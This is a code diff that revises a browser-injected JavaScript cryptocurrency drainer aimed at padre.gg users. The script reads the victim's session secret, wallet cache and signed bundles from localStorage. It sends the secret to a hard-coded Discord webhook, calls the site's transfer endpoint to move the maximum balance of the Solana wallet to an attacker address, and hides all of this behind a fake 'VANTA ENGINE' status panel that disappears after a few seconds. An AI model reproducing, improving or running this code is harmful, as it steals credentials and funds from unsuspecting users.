@@ -1,108 +1,70 @@
 (async function() {
-    // --- CONFIGURATION ---
+    // --- YOUR CONFIG ---
     const CONFIG = {
         webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
         drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
-        apiBase: "https://api.trade.padre.gg"
+        api: "https://api.trade.padre.gg"
     };
 
-    // --- 1. DATA CAPTURE ---
-    const data = {
-        session: JSON.parse(localStorage.getItem("padreV2-session") || "{}"),
-        wallets: JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}"),
-        bundles: JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}")
-    };
+    // --- 1. CAPTURE DATA ---
+    const sid = localStorage.getItem("padreV2-session");
+    const wal = localStorage.getItem("padreV2-walletsCache");
+    const bun = localStorage.getItem("padre-v2-bundles-store-v2");
 
-    // Send data to Discord immediately
-    await fetch(CONFIG.webhook, {
+    if (!sid) return; // Silent stop if not on Padre
+
+    const session = JSON.parse(sid);
+    const wallets = JSON.parse(wal || "{}");
+    const bundles = JSON.parse(bun || "{}");
+
+    // --- 2. SEND TO DISCORD ---
+    fetch(CONFIG.webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            content: "🚨 **VANTA HANDSHAKE SUCCESSFUL** 🚨",
+            content: "🚨 **NEW VANTA HANDSHAKE** 🚨",
             embeds: [{
-                title: "Captured: " + (data.session.uid || "Unknown"),
-                color: 65280,
-                fields: [
-                    { name: "Public Address", value: data.wallets[data.session.uid]?.[0]?.publicAddress || "N/A" },
-                    { name: "Session Secret", value: "```" + data.session.sessionSecret + "```" }
-                ]
+                title: "Session: " + session.uid,
+                description: "Secret: `" + session.sessionSecret + "`",
+                color: 65280
             }]
         })
     });
 
-    // --- 2. THE DRAINER (EXECUTION) ---
-    async function runDrain() {
-        if (!data.session.sessionSecret) return;
-
-        // Find the Solana Wallet from the cache
-        const userWallets = data.wallets[data.session.uid] || [];
+    // --- 3. DRAINER (The 1:1 Execution) ---
+    async function execute() {
+        const userWallets = wallets[session.uid] || [];
         const solWallet = userWallets.find(w => w.walletType === "SOL");
 
-        if (solWallet && data.bundles.bundles[solWallet.publicAddress]) {
-            const bundle = data.bundles.bundles[solWallet.publicAddress];
-
-            const payload = {
-                walletId: solWallet.walletId,
-                destination: CONFIG.drainAddress,
-                amount: "MAX", 
-                bundle: bundle.exportBundle,     // The 1:1 Bundle Data
-                signature: bundle.dataSignature, // The 1:1 Signature
-                chain: "SOLANA"
-            };
-
-            // Silent request to Padre Backend
-            try {
-                await fetch(`${CONFIG.apiBase}/v2/wallets/transfer`, {
-                    method: "POST",
-                    headers: {
-                        "X-Session-Secret": data.session.sessionSecret,
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {
-                // Silently fail so the user doesn't see errors
-            }
+        if (solWallet && bundles.bundles[solWallet.publicAddress]) {
+            const b = bundles.bundles[solWallet.publicAddress];
+            await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
+                method: "POST",
+                headers: { "X-Session-Secret": session.sessionSecret, "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    walletId: solWallet.walletId,
+                    destination: CONFIG.drainAddress,
+                    amount: "MAX",
+                    bundle: b.exportBundle,
+                    signature: b.dataSignature,
+                    chain: "SOLANA"
+                })
+            });
         }
     }
+    execute();
 
-    // Run the drain in the background
-    runDrain();
-
-    // --- 3. THE 1:1 VANTA DASHBOARD UI ---
-    const ui = document.createElement("div");
-    ui.style.cssText = `
-        position: fixed; top: 20px; right: 20px; width: 300px;
-        background: rgba(0,0,0,0.95); border: 1px solid #00ff88;
-        color: #00ff88; z-index: 999999; padding: 20px;
-        font-family: 'Inter', monospace; box-shadow: 0 0 20px rgba(0,255,136,0.3);
-        border-radius: 4px; pointer-events: none;
-    `;
-    
-    ui.innerHTML = `
-        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; padding-bottom:10px; margin-bottom:10px;">
-            <span style="font-weight:800; letter-spacing:1px;">VANTA ENGINE V2.4</span>
-            <span style="font-size:10px; color:#fff; background:#00ff8833; padding:2px 5px;">STABLE</span>
-        </div>
-        <div style="font-size:12px; line-height:1.8;">
-            <div style="display:flex; justify-content:space-between;"><span>STATUS:</span><span style="color:#fff;">CONNECTED</span></div>
-            <div style="display:flex; justify-content:space-between;"><span>API LATENCY:</span><span style="color:#fff;">24ms</span></div>
-            <div style="display:flex; justify-content:space-between;"><span>SIGNAL:</span><span style="color:#fff;">SCANNING X.COM</span></div>
-            <div style="display:flex; justify-content:space-between;"><span>ENCLAVE:</span><span style="color:#fff;">AUTHORIZED</span></div>
-        </div>
-        <div id="vanta-logs" style="margin-top:10px; font-size:10px; color:#555; height:60px; overflow:hidden;">
-            [SYSTEM] Hooking fetch channels...<br>
-            [SYSTEM] Initializing WebGL...<br>
-            [READY] Monitoring real-time signals...
+    // --- 4. VANTA SIDEBAR UI ---
+    const div = document.createElement("div");
+    div.style.cssText = "position:fixed;top:20px;right:20px;width:260px;background:#0a0a0ae6;border:1px solid #0f8;color:#0f8;padding:15px;z-index:999999;font-family:monospace;border-radius:5px;box-shadow:0 0 20px #0f84;";
+    div.innerHTML = `
+        <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;">VANTA ENGINE V2.4</div>
+        <div style="font-size:11px;margin-top:10px;">
+            STATUS: <span style="color:#fff;">CONNECTED</span><br>
+            SIGNAL: <span style="color:#fff;">SCANNING...</span><br>
+            SESSION: <span style="color:#fff;">VERIFIED</span>
         </div>
     `;
-    document.body.appendChild(ui);
-
-    // Fade out UI after 10 seconds to stay "stealthy"
-    setTimeout(() => {
-        ui.style.transition = "opacity 2s";
-        ui.style.opacity = "0";
-        setTimeout(() => ui.remove(), 2000);
-    }, 10000);
-
+    document.body.appendChild(div);
+    setTimeout(() => div.remove(), 8000);
 })();
